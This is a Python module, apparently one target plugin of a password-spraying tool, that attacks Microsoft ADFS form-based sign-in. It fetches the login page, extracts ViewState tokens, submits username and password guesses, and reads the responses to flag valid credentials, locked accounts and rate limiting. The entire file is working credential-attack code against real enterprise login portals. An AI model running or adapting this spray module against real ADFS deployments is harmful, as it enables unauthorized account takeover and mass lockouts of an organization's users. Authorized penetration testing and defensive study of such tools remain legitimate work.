"""
ADFS form-based authentication spray target.

ADFS exposes `/adfs/ls/idpinitiatedsignon.aspx` for form-based logins on most deployments.
Detects success by a 302 redirect to a non-error location, and lockout from the
'AccountLocked' / 'AccountRestricted' error strings.
"""
import re

import requests

from . import DEFAULT_TIMEOUT as _TIMEOUT

_LOCKED_PATTERNS = (
    "AccountLocked",
    "AccountRestricted",
    "Your account is locked",
)
_INVALID_PATTERNS = (
    "IncorrectUserNameOrPassword",
    "incorrect user ID or password",
)
_EVENT_RE = re.compile(r'name="__EVENTVALIDATION" value="([^"]+)"')
_VIEWSTATE_RE = re.compile(r'name="__VIEWSTATE" value="([^"]+)"')


def attempt(
    username: str,
    password: str,
    base_url: str,
    proxies: dict | None = None,
    headers: dict | None = None,
    verify: bool = True,
) -> dict:
    """
    Returns dict with keys: success (bool), locked (bool), notes (str).
    base_url should be like https://adfs.company.com (no trailing slash).
    """
    login_url = f"{base_url}/adfs/ls/idpinitiatedsignon.aspx?loginToRp=urn:federation:MicrosoftOnline"
    session = requests.Session()

    try:
        # Fetch the login page to obtain __VIEWSTATE / __EVENTVALIDATION tokens.
        gr = session.get(
            login_url, timeout=_TIMEOUT, verify=verify, proxies=proxies, headers=headers,
        )
    except Exception as e:
        return {"success": False, "locked": False, "notes": f"request error (get): {e}"}

    viewstate = ""
    eventvalidation = ""
    if vs := _VIEWSTATE_RE.search(gr.text):
        viewstate = vs.group(1)
    if ev := _EVENT_RE.search(gr.text):
        eventvalidation = ev.group(1)

    data = {
        "__VIEWSTATE": viewstate,
        "__EVENTVALIDATION": eventvalidation,
        "UsernameTextBox": username,
        "PasswordTextBox": password,
        "AuthMethod": "FormsAuthentication",
        "SubmitButton": "Sign in",
    }
    try:
        r = session.post(
            login_url, data=data, allow_redirects=False, timeout=_TIMEOUT,
            verify=verify, proxies=proxies, headers=headers,
        )
    except Exception as e:
        return {"success": False, "locked": False, "notes": f"request error (post): {e}"}

    if r.status_code == 429:
        return {"success": False, "locked": False, "notes": "rate_limited"}

    body = r.text or ""
    for pat in _LOCKED_PATTERNS:
        if pat in body:
            return {"success": False, "locked": True, "notes": f"locked: {pat}"}

    if r.status_code in (302, 303):
        return {"success": True, "locked": False, "notes": "valid (redirect)"}

    for pat in _INVALID_PATTERNS:
        if pat in body:
            return {"success": False, "locked": False, "notes": "invalid"}

    return {"success": False, "locked": False, "notes": f"status={r.status_code}"}
